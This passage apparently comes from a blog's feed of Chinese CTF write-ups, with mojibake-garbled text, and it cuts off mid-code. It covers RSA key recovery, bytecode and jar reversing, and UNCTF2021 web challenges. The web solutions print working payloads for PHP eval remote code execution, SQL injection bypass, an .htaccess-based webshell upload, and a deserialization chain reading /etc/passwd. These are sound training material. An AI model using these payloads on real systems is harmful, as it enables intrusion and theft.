* &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;if l,s are correct: alpha = k * t beta = k * (p&#x27; - l) + t * (q&#x27; - l)i.e:&quot;&quot;&quot;def alpha_from_pprime_qprime_l(pprime, qprime, l): return pprime*qprime - ldef beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha): temp1 = e*d - 1 assert temp1 % s == 0 temp2 = ((temp1 // s) - 1) * l * l temp3 = temp2 + l * (pprime + qprime) return temp3 - alpha - (pprime*qprime)def k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta): a = pprime - l b = -beta c = alpha * (qprime - l) disc = b * b - 4 * a * c assert gmpy2.is_square(disc) temp = -b + gmpy2.isqrt(disc) assert temp % (2*a) == 0 k = temp // (2*a) assert alpha % k == 0 return k, alpha // kdef brute_k_t_l(pprime, qprime, e, d): # l, s = 2, 2 ss = [s for s in range(e - 100000, e + 1000000) if s!=0 and (e*d - 1) % s == 0] for l, s in product(range(1, 5000), ss): #print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;) try: alpha = alpha_from_pprime_qprime_l(pprime, qprime, l) beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha) k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta) return k, t, l except AssertionError: continueif __name__ == &quot;__main__&quot;: e = 0x10005 #fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 d = 0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 pprime = 0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3 qprime = 0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b k, t, l = brute_k_t_l(pprime, qprime, e, d) lp, lq = qprime + k, pprime + t assert lp % l == 0, lq % l == 0 p, q = lp // l, lq // l assert gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime assert gmpy2.is_prime(p), gmpy2.is_prime(q) N = p*q c = 0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386 flag_decoded = pow(c, d, N) print(long_to_bytes(flag_decoded)) # b&#x27;flag&#123;c4617a206ba83d7f824dc44e5e67196a&#125;&#x27; â€‹ REVERSElemon reç­¾åˆ°é¢˜ï¼Œæ ¼å¼ï¼šflag{output} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781790: const 60 ; &lt;module &#x27;main&#x27;&gt; 5: module 9 59211: const 26 ; 83 16: const 27 ; 69 21: const 28 ; 65 26: array 331: store 0 034: const 30 ; 101 39: const 31 ; 108 44: const 32 ; 111 49: const 33 ; 117 54: const 34 ; 122 59: const 30 ; 101 64: const 35 ; 105 69: const 36 ; 98 74: const 30 ; 101 79: const 31 ; 108 84: const 33 ; 117 89: const 35 ; 105 94: const 37 ; 113 99: const 33 ; 117 104: const 35 ; 105 109: const 37 ; 113 114: array 16119: store 0 1122: const 39 ; 0 127: store 0 2130: array 0135: store 0 3138: load 0 2141: const 42 ; 256 146: lt147: jz 184152: load 0 3155: const 43 ; append 160: getattr161: load 0 2164: call 1166: pop167: load 0 2170: const 44 ; 1 175: add176: store 0 2179: jmp 138184: const 39 ; 0 189: store 0 4192: load 0 4195: const 42 ; 256 200: lt201: jz 271206: load 0 3209: load 0 4212: getitem213: load 0 0216: load 0 4219: const 46 ; 3 224: mod225: getitem226: add227: load 0 1230: load 0 4233: const 47 ; 16 238: mod239: getitem240: add241: const 42 ; 256 246: mod247: load 0 3250: load 0 4253: setitem254: load 0 4257: const 44 ; 1 262: add263: store 0 4266: jmp 192271: const 39 ; 0 276: store 0 5279: load 0 5282: const 46 ; 3 287: lt288: jz 448293: const 39 ; 0 298: store 0 6301: load 0 6304: const 42 ; 256 309: lt310: jz 366315: load 0 3318: load 0 6321: getitem322: load 0 3325: load 0 6328: const 44 ; 1 333: add334: const 42 ; 256 339: mod340: getitem341: bxor342: load 0 3345: load 0 6348: setitem349: load 0 6352: const 44 ; 1 357: add358: store 0 6361: jmp 301366: const 39 ; 0 371: store 0 7374: load 0 7377: const 42 ; 256 382: lt383: jz 431388: load 0 3391: load 0 7394: getitem395: const 44 ; 1 400: add401: const 42 ; 256 406: mod407: load 0 3410: load 0 7413: setitem414: load 0 7417: const 44 ; 1 422: add423: store 0 7426: jmp 374431: load 0 5434: const 44 ; 1 439: add440: store 0 5443: jmp 279448: const 39 ; 0 453: store 0 5456: const 39 ; 0 461: store 0 8464: load 0 5467: const 42 ; 256 472: lt473: jz 509478: load 0 8481: load 0 3484: load 0 5487: getitem488: add489: store 0 8492: load 0 5495: const 44 ; 1 500: add501: store 0 5504: jmp 464509: load 0 8512: const 51 ; 20 517: mul518: const 52 ; 5 523: add524: store 0 8527: load 0 8530: const 54 ; 30 535: mul536: const 52 ; 5 541: sub542: store 0 8545: load 0 8548: const 56 ; 40 553: mul554: const 52 ; 5 559: sub560: store 0 8563: load 0 8566: const 58 ; 50 571: mul572: const 59 ; 6645 577: add578: store 0 8581: const 23 ; &lt;function &#x27;print&#x27;&gt; 586: load 0 8589: call 1591: pop æ ¹æ®bytecodeè¿˜åŸä»£ç ï¼Œéœ€è¦æ³¨æ„æ•°ç»„çš„å­˜å‚¨é¡ºåºï¼š 123456789101112131415161718192021222324252627key = [83,69,65][::-1]c = [101,108,111,117,122,101,105,98,101,108,117,105,113,117,105,113][::-1]S = []for i in range(256): S.append(i)for j in range(256): S[j] = (S[j]+key[j%3]+c[j%16])%256for k in range(3): for x in range(256): S[x] = S[x]^S[(x+1)%256] for y in range(256): S[y] = (S[y]+1)%256b = 0for k in range(256): b = b+S[k]b = b*20+5b = b*30-5b = b*40-5b = b*50+6645print(b)# 23075096395 flagï¼šflag&#123;23075096395&#125; â€‹ combat_slogan é¢å¯¹ç–«æƒ…ï¼Œæˆ‘ä»¬çš„å£å·æ˜¯ä»€ä¹ˆï¼Ÿflag{input} ç”¨jdå·¥å…·åˆ†æjarï¼Œåœ¨Main.classå‘ç°ä¸»ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.xaut;import java.util.Scanner;public class Main &#123; public static String stringTransformAscii(String value) &#123; StringBuffer sbu = new StringBuffer(); char[] chars = value.toCharArray(); for (int i = 0; i &lt; chars.length; i++) &#123; if (i != chars.length - 1) &#123; sbu.append(chars[i]).append(&quot;,&quot;); &#125; else &#123; sbu.append(chars[i]); &#125; &#125; return sbu.toString(); &#125; public static String ttk(String input) &#123; StringBuilder sb = new StringBuilder(); for (int i = 0; i &lt; input.length(); i++) &#123; char c = input.charAt(i); if (c &gt;= &#x27;a&#x27; &amp;&amp; c &lt;= &#x27;m&#x27;) &#123; c = (char)(c + 13); &#125; else if (c &gt;= &#x27;A&#x27; &amp;&amp; c &lt;= &#x27;M&#x27;) &#123; c = (char)(c + 13); &#125; else if (c &gt;= &#x27;n&#x27; &amp;&amp; c &lt;= &#x27;z&#x27;) &#123; c = (char)(c - 13); &#125; else if (c &gt;= &#x27;N&#x27; &amp;&amp; c &lt;= &#x27;Z&#x27;) &#123; c = (char)(c - 13); &#125; sb.append(c); &#125; return sb.toString(); &#125; public static void main(String[] args) &#123; System.out.println(&quot;Please input your keyword); Scanner scan = new Scanner(System.in); String str2 = &quot;ddd&quot;; if (scan.hasNextLine()) str2 = scan.nextLine(); scan.close(); String stringTransformAscii = stringTransformAscii(str2); String[] offerCodeString = stringTransformAscii.split(&quot;,&quot;); StringBuffer str5 = new StringBuffer(); for (String s : offerCodeString) str5.append(s); int flag = ttk(str2).compareTo(&quot;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&quot;); if (flag == 0 &amp;&amp; str5.toString().compareTo(&quot;871019511949491089510249103104116951164895101110100951164895101110100959997122121&quot;) == 0) &#123; System.out.println(&quot;Your keyword is correct!&quot;); &#125; else &#123; System.out.println(&quot;Your keyword is wrong!&quot;); &#125; &#125;&#125; flagç» ttk() å‡½æ•°å¤„ç†åä¸ Jr_j11y_s1tug_g0_raq_g0_raq_pnml ç›¸åŒï¼Œé€† ttk() æ›¿æ¢å‡½æ•°ï¼š 1234567891011121314151617s = &#x27;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&#x27;t = &#x27;&#x27;for k in s: if ord(k)-13 &gt;= ord(&#x27;a&#x27;) and ord(k)-13 &lt;= ord(&#x27;m&#x27;): t += chr(ord(k)-13) elif ord(k)-13 &gt;= ord(&#x27;A&#x27;) and ord(k)-13 &lt;= ord(&#x27;M&#x27;): t += chr(ord(k)-13) elif ord(k)+13 &gt;= ord(&#x27;n&#x27;) and ord(k)+13 &lt;= ord(&#x27;z&#x27;): t += chr(ord(k)+13) elif ord(k)+13 &gt;= ord(&#x27;N&#x27;) and ord(k)+13 &lt;= ord(&#x27;Z&#x27;): t += chr(ord(k)+13) else: t += kprint(t)# We_w11l_f1ght_t0_end_t0_end_cazy flagï¼šflag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125; â€‹ cute_doge æ™®é€šçš„æŸ´çŠ¬ï¼Œæˆ³ä¸€æˆ³ä¼šå‘ç”Ÿä»€ä¹ˆå¥‡å¦™çš„äº‹æƒ…å‘¢ï¼Ÿ å°†exeç”¨16è¿›åˆ¶å·¥å…·æŸ¥çœ‹ï¼Œæ ¹æ®è¿è¡Œæç¤ºæ–‡å­—æ‰¾åˆ°é™„è¿‘å­˜åœ¨ ZmxhZ3tDaDFuYV95eWRzX2Nhenl9ï¼Œbase64è§£ç å¾—flagï¼šflag&#123;Ch1na_yyds_cazy&#125;ã€‚ â€‹ hello_py åˆæ¬¡è§é¢ï¼Œé€ä¸ªpythoné¢˜ï¼Œç¥æ‚¨æ¥ä¸‹æ¥è§£é¢˜é¡ºåˆ©ï¼Œflag{input} uncompyle6åç¼–è¯‘pycæ–‡ä»¶å¾—æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import threading, timedef encode_1(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ num num -= 1 time.sleep(1) if num &lt;= 0: breakdef encode_2(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ flag[(num + 1)] num -= 1 time.sleep(1) if num &lt; 0: breakwhile True: Happy = [ 44, 100, 3, 50, 106, 90, 5, 102, 10, 112] num = 9 f = input(&#x27;Please input your flag:&#x27;) if len(f) != 10: print(&#x27;Your input is illegal&#x27;) else: flag = list(f) j = 0 for i in flag: flag[j] = ord(i) j += 1 else: print(&quot;flag to &#x27;ord&#x27;:&quot;, flag) t1 = threading.Thread(target=encode_1, args=(1, )) t2 = threading.Thread(target=encode_2, args=(2, )) t1.start() time.sleep(0.5) t2.start() t1.join() t2.join() if flag == Happy: print(&#x27;Good job!&#x27;) else: print(&#x27;No no no!&#x27;) ç”¨z3æ±‚è§£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import threading, timefrom z3 import *f = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(10)]flag = f[:]x = Solver()def encode_1(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ num num -= 1 time.sleep(1) if num &lt;= 0: breakdef encode_2(n): global num while True: if num &gt;= 0: flag[num] = flag[num] ^ flag[(num + 1)] num -= 1 time.sleep(1) if num &lt; 0: breakwhile True: Happy = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112] num = 9 j = 0 t1 = threading.Thread(target=encode_1, args=(1, )) t2 = threading.Thread(target=encode_2, args=(2, )) t1.start() time.sleep(0.5) t2.start() t1.join() t2.join() for k in range(10): x.add(flag[k]==Happy[k]) if x.check() == sat: m = x.model() print(&#x27;&#x27;.join([chr(m[f[i]].as_long()) for i in range(len(f))])) break # He110_cazy flagï¼šflag&#123;He110_cazy&#125; â€‹ WEBRCE_No_Para 1234567891011&lt;?phpif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; if(!preg_match(&#x27;/session|end|next|header|dir/i&#x27;,$_GET[&#x27;code&#x27;]))&#123; eval($_GET[&#x27;code&#x27;]); &#125;else&#123; die(&quot;Hacker!&quot;); &#125;&#125;else&#123; show_source(__FILE__);&#125;?&gt; ç¬¬ä¸€å±‚æ­£åˆ™è¡¨è¾¾å¼ä¸ºé€’å½’åŒ¹é…åªå«å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿çš„æ— å‚å‡½æ•°ï¼Œå¦‚ a(b_c());ï¼Œç¬¬äºŒå±‚è¦æ±‚ä¸èƒ½åŒ…å« session|end|next|header|dir å…³é”®å­—ï¼Œä½¿ç”¨ get_defined_vars() å¯ä»è¯·æ±‚ä¸­å‘ $_GET ä¼ å…¥æ‰€éœ€æ‰§è¡Œçš„å‡½æ•°ï¼Œç”±äº end å’Œ next ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä½¿ç”¨ reset å’Œ array_reverse è°ƒæ•´æ•°ç»„ä¸å–å€¼ï¼Œå†åˆ©ç”¨ eval å‘½ä»¤æ‰§è¡Œã€‚ payloadï¼š?code=eval(reset(array_reverse(current(get_defined_vars()))));&amp;b=system(&quot;cat%20flag.php&quot;);","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"UNCTF2021-å…¬å¼€èµ›","slug":"match-UNCTF2021å…¬å¼€èµ›","date":"2021-12-07T11:44:54.000Z","updated":"2021-12-07T16:08:16.383Z","comments":true,"path":"2021/12/07/match-UNCTF2021å…¬å¼€èµ›/","permalink":"https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"â€‹ ä¸ºå“åº”å›½å®¶é€‰æ‹”ã€æ¨èä¼˜ç§€ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šäººæ‰ï¼ŒåŸ¹å…»å­¦ç”Ÿçš„åˆ›æ–°æ„è¯†ä¸å›¢é˜Ÿåˆä½œç²¾ç¥ï¼Œæé«˜å¤§å­¦ç”Ÿçš„ç½‘ç»œå®‰å…¨æŠ€æœ¯æ°´å¹³ã€åˆ›æ–°å®è·µä¸ç»¼åˆè®¾è®¡èƒ½åŠ›ï¼Œæ¨åŠ¨æˆ‘å›½é«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šå»ºè®¾ä¸æ”¹é©ï¼Œå…¨å›½9æ‰€é«˜æ ¡ï¼ˆé—½å—å¸ˆèŒƒå¤§å­¦ï¼Œç¦å·å¤§å­¦è‡³è¯šå­¦é™¢ï¼Œé‡åº†å¤§å­¦ï¼Œé™†å†›å·¥ç¨‹å¤§å­¦ï¼Œå—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ï¼Œé‡‘é™µç§‘æŠ€å­¦é™¢ï¼Œè¥¿åå¤§å­¦ï¼Œæµ™æ±Ÿå¸ˆèŒƒå¤§å­¦ï¼Œå¦é—¨ç†å·¥å¤§å­¦ï¼‰å†³å®šç»„æˆè”åˆæ‹›æ–°èµ›ï¼Œç§‰ç€å…¬å¹³ï¼Œå…¬æ­£ï¼Œå…¬å¼€çš„åŸåˆ™ä¸ºæœ¬é«˜æ ¡é€‰æ‹”ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šäººæ‰ã€‚ ç«èµ›æ—¶é—´ 2021å¹´11æœˆ28æ—¥-2021å¹´12æœˆ6æ—¥ ç«èµ›å¹³å° è‡ªç ”å¹³å°ï¼Œå¹³å°åœ°å€ï¼šhttps://ctf.unctf.com/ Rank: 1 # Webfuzz_md5 1234567891011121314151617181920&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$user=$_GET[&quot;user&quot;];$pass=$_POST[&quot;pass&quot;];$pass2=md5($pass);$pass3=substr($pass2, 0, 5);$a=preg_replace(&quot;/unctf/i&quot;,&quot;&quot;,$user);if($a===&quot;unctf&quot;)&#123; if($pass3===&quot;66666&quot;)&#123; echo $flag; &#125; else&#123; echo &quot;welcome to unctf~&quot;; &#125;&#125;else&#123; echo &quot;welcome to unctf~~&quot;;&#125; user å‚æ•°å€¼åŒå†™ç»•è¿‡ï¼Œpass å‚æ•°å€¼çˆ†ç ´ç¬¦åˆå‰5ä½æ˜¯66666çš„MD5ï¼š 12345678from hashlib import md5for i in range(100000000): x = md5(str(i).encode()).hexdigest() if x.startswith(&#x27;66666&#x27;): print(i) break# 1004649 Payloadï¼šhttp://xxx/?user=ununctfctfï¼ŒPOSTä¼ å‚ pass=1004649ã€‚ flagï¼šUNCTF&#123;13875534-9edb-4e2b-b51c-b18091ca1284&#125; â€‹ can_you_hacked_me å¸¦é»‘é˜”ï¼Œä½ èƒ½æŠŠæˆ‘éª‡å’¯ï¼Ÿ www.zip å¾—åˆ°æºç ã€‚ index.phpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Can You Hacked me?&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Can You Hacked me?&lt;/h1&gt;&lt;form method=&quot;get&quot;&gt; Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt; Password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;pre&gt;&lt;?phpinclude &quot;flag.php&quot;;error_reporting(0);function waf1($inject) &#123; preg_match(&quot;/&#x27;|union|select|&amp;|\\||and|or|\\(|,/i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/\\&#x27;|union|select|&amp;|\\\\||and|or|(|,/i&quot;,$inject);&#x27;);&#125;if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123; $username = $_GET[&#x27;username&#x27;]; $password = $_GET[&#x27;password&#x27;]; waf1($username) || waf1($password); if (strtolower($_GET[&#x27;username&#x27;]) == &#x27;admin&#x27; &amp;&amp; $_SERVER[&quot;REMOTE_ADDR&quot;] != &#x27;127.0.0.1&#x27;) &#123; die(&#x27;Admin only allow to login at localhost&#x27;); &#125; $conn = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;); $sql = &quot;select * from `users` where username = &#x27;$username&#x27; and password = &#x27;$password&#x27;;&quot;; $result = $conn-&gt;query($sql); echo $sql . &#x27;&lt;br&gt;&#x27;; if ($result-&gt;num_rows &gt; 0) &#123; // è¾“å‡ºæ•°æ® while($row = $result-&gt;fetch_assoc()) &#123; if($row[&quot;username&quot;] === &#x27;admin&#x27;) &#123; echo &#x27;Welcome Admin, here is your flag: &#x27; . $flag; &#125; else &#123; die(&quot;You are not Admin.&quot;); &#125; &#125; &#125; else &#123; echo &quot;Result Not Found!&quot;; &#125; $conn-&gt;close();&#125;?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt; db.sqlï¼š 123456789101112CREATE DATABASE IF NOT EXISTS supersqli;USE supersqli;CREATE TABLE IF NOT EXISTS `users` ( `id` int(10) NOT NULL, `username` varchar(20) NOT NULL, `password` varchar(20) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8;INSERT INTO `users` values(1,&#x27;test&#x27;, &#x27;test&#x27;),(2,&#x27;admin&#x27;,&#x27;AdminSecret&#x27;); ç¦ç”¨çš„å…³é”®å­—ä½¿å¾—éš¾ä»¥è¿›è¡Œå¸¸è§„æ³¨å…¥ï¼Œè€ƒè™‘è®©whereæ¡ä»¶æ’çœŸï¼Œusername ä¼ å…¥ \\ è½¬ä¹‰åå•å¼•å·ï¼Œä½¿ username çš„å€¼ä¸º &#39; and password =ï¼Œpassword ä¼ å…¥å¼‚æˆ–æ“ä½œï¼Œä½¿æ€»æ¡ä»¶æ’çœŸï¼Œå†ç­›é€‰å‡ºç¬¬äºŒæ¡æ•°æ®å³å¯è®©æŸ¥è¯¢ç»“æœä¸º adminã€‚ Payloadï¼š http://xxx/?username=\\&amp;password=^0 limit 2 offset 1 --+ flagï¼šUNCTF&#123;3abc4508-17c4-488e-9b2b-3fa11fee771c&#125; â€‹ phpmysql ä½ äº†è§£flagå—?åœ¨æ ¹ç›®å½•å“¦ 123456789101112131415161718192021222324252627282930&lt;?phpshow_source(__FILE__);echo(&quot;æ¬¢è¿æ¥åˆ°unctf2021ï¼Œhave fun&quot;.&quot;&lt;br&gt;&quot;);$db_host=$_POST[&#x27;host&#x27;];$db_user=$_POST[&#x27;user&#x27;];$db_pwd=$_POST[&#x27;pwd&#x27;];$db_port=$_POST[&#x27;port&#x27;];if($db_host==&quot;&quot;)&#123; die(&quot;æ•°æ®åº“åœ°å€ä¸èƒ½ä¸ºç©ºï¼&quot;);&#125;if(is_numeric($db_host))&#123; echo(&quot;fakeflag is /flag&quot;.&quot;&lt;br&gt;&quot;); if(preg_match(&quot;/;|\\||&amp;/is&quot;,$db_user) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_pwd) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_port))&#123; die(&quot;å˜‰ç„¶ä»Šå¤©åƒä»€ä¹ˆ&quot;); &#125; system(&quot;mysql -h $db_host -u $db_user -p $db_pwd -P $db_port --enable-local-infile&quot;);&#125;else&#123; echo(&quot;Maybe you can do someting else&quot;.&quot;&lt;br&gt;&quot;); if(!isset($db_user) || !isset($db_pwd))&#123; eval(&quot;echo new Exception(\\&quot;&lt;script&gt;alert(&#x27;å…³æ³¨å˜‰ç„¶ï¼Œé¡¿é¡¿è§£é¦‹ï¼ï¼ï¼&#x27;);&lt;/script&gt;\\&quot;);&quot;); &#125; else&#123; $db_user = str_ireplace(&quot;SplFileObject&quot;, &quot;UNCTF2021&quot;, $db_user); eval(&quot;echo new $db_user($db_pwd);&quot;); &#125;&#125; åˆ©ç”¨æœ€å eval(&quot;echo new $db_user($db_pwd);&quot;); çš„æ‹¼æ¥ç‰¹æ€§ï¼Œç”¨ç±» DirectoryIterator åˆ—ç›®å½•åï¼Œå†RCEã€‚ Payloadï¼š POSTä¼ å‚ host=x&amp;pwd=y&amp;port=z&amp;user=DirectoryIterator(&quot;glob:///*&quot;);system(&quot;cat /fllllaaaaag&quot;);// â€‹ babywrite 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);$sandbox = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (!is_dir($sandbox)) &#123; mkdir($sandbox);&#125;if (isset($_GET[&#x27;filename&#x27;]) &amp;&amp; isset($_GET[&#x27;content&#x27;])) &#123; $filename = $_GET[&#x27;filename&#x27;]; $content = $_GET[&#x27;content&#x27;]; if (preg_match_all(&quot;/ph|\\.\\.|\\//i&quot;, $filename) || strlen($filename) &gt; 10) &#123; die(&quot;No way!&quot;); &#125; if (preg_match_all(&quot;/&lt;\\?|ph/&quot;, $content)) &#123; die(&quot;No way!&quot;); &#125; $filename = $sandbox . &quot;/&quot; . $filename; @file_put_contents($filename, $content); echo $filename;&#125; ä¼ å…¥æ–‡ä»¶åå’Œå†…å®¹å†™æ–‡ä»¶ï¼Œç¦ç”¨çš„å…³é”®å­—ç¦æ‰äº†ä¼ªåè®®ã€ç›®å½•ç©¿è¶Šã€å¸¸è§„PHPå¤´å’Œå†™PHPæ–‡ä»¶ã€‚ ç”±äºsandboxå†…æ— ç°æˆPHPæ–‡ä»¶ï¼Œè€ƒè™‘å†™ .htaccess æ–‡ä»¶å°†æ™®é€šæ–‡ä»¶ä»¥PHPæ–‡ä»¶è§£æã€‚ æ–‡ä»¶å†…æ— æ³•å†™å…¥PHPä»£ç ï¼Œå¯ä»¥å…ˆå†™å…¥base64ç¼–ç å­—ç¬¦ä¸²åï¼Œå†åˆ©ç”¨ .htaccess æ–‡ä»¶ä¼ªåè®®è§£æå³å¯ï¼Œ .htaccess æ–‡ä»¶ä¸­çš„ç”¨åˆ°çš„ php å…³é”®å­—ç”¨ \\ æ¢è¡Œç»•è¿‡ã€‚ .htaccess æ–‡ä»¶å†…å®¹ï¼š 12345AddType application/x-httpd-p\\hp .jpgp\\hp_value auto_append_file &quot;p\\hp://filter/convert.base64-decode/resource=1.jpg&quot; Payloadï¼š http://xxx/?filename=.htaccess&amp;content=AddType%20application/x-httpd-p\\%0ahp%20.jpg%0ap\\%0ahp_value%20auto_append_file%20&quot;p\\%0ahp://filter/convert.base64-decode/resource=1.jpg&quot; http://xxx/?filename=1.jpg&amp;content=PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs%2FPg%3D%3D æœ€åè®¿é—® 1.jpg å¾—åˆ°flagã€‚ â€‹ easy_serialize 12345678910111213141516171819202122232425262728293031&lt;?phpinclude &quot;function.php&quot;;$action = @$_POST[&#x27;action&#x27;];$name = $_POST[&#x27;name&#x27;];$pass = $_POST[&#x27;pass&#x27;];$email = $_POST[&#x27;email&#x27;];function filter($file)&#123; $filter_arr = array(&#x27;flag&#x27;,&#x27;php&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$file);&#125;$a= $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];$u = new UNCTF($pass,$email,$name);$s = serialize($u);switch($action)&#123; case 1: highlight_file(&#x27;function.php&#x27;); break; default: highlight_file(&#x27;index.php&#x27;);&#125;if(md5($a) == md5($b) &amp;&amp; $a !=$b)&#123; unserialize(filter($s));&#125; POSTä¼ å…¥ action=1ï¼Œå¾—åˆ° function.php æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass me7eorite&#123; //test public $safe; public $class; public function __construct() &#123; $this-&gt;safe = &quot;/etc/passwd&quot;; $this-&gt;class=new UNCTF(&#x27;me7eorite&#x27;,&#x27;me7eorite@qq.com&#x27;,&#x27;me7eorite&#x27;); &#125; public function __toString() &#123; $this-&gt;class-&gt;getShell(); return &#x27;&#x27;; &#125; public function getShell()&#123; readfile($this-&gt;safe); &#125;&#125;class UNCTF&#123; public $pass; public $email; public $name; public function __construct($pass,$email,$name) &#123; $this-&gt;pass = $pass; $this-&gt;name = $name; $this-&gt;email = $email; &#125; public function getShell()&#123; echo &#x27;flag&#123;this_is_fake&#125;&#x27;; &#125; public function __destruct() &#123; echo $this-&gt;name . &#x27;Welcome to UNCTF 2021!&#x27;; &#125;&#125; ç¬¬ä¸€å±‚ï¼ŒPHPå¼±æ¯”è¾ƒç‰¹æ€§ï¼Œæ•°ç»„ç»•è¿‡ï¼Œä¼ å…¥ ?a[]=1&amp;b[]=2ï¼› ç¬¬äºŒå±‚ï¼ŒPHPåºåˆ—åŒ–+ååºåˆ—åŒ–ï¼Œfilter() åˆ é™¤ä¸‰ç§å…³é”®å­—ï¼Œæ˜æ˜¾çš„å‡å­—ç¬¦å‹ååºåˆ—åŒ–é€ƒé€¸ã€‚ æœ¬åœ°æµ‹è¯•ï¼Œå…ˆæ­£å¸¸POSTä¼ å€¼ name=z&amp;pass=x&amp;email=yï¼Œå¾—åˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:3:&quot;x&quot;;s:5:&quot;email&quot;;s:3:&quot;y&quot;;s:4:&quot;name&quot;;s:3:&quot;z&quot;;&#125;ã€‚ è§‚å¯Ÿåˆ©ç”¨é“¾ï¼šç±»UNCTF çš„ __destruct() ä¸­ï¼Œæ§åˆ¶ $this-&gt;name å¯ä»¥è§¦å‘ç±» me7eorite çš„ __toString()ï¼Œæ§åˆ¶ $this-&gt;class ä¸ºæ–°çš„ me7eorite å¯¹è±¡ï¼Œé¿å…è°ƒç”¨ç±» UNCTF çš„ getShell()ï¼Œè€Œè°ƒç”¨ç±» me7eorite çš„ getShell()ï¼Œå†æ§åˆ¶ $this-&gt;safe å¯ä»»æ„è¯»ã€‚ 1234567891011121314&lt;?php...$y = new me7eorite;$x = new me7eorite;$x-&gt;safe = &#x27;/etc/passwd&#x27;;$x-&gt;class = $y;$name = $x;$pass = &#x27;x&#x27;;$email = &#x27;y&#x27;;$u = new 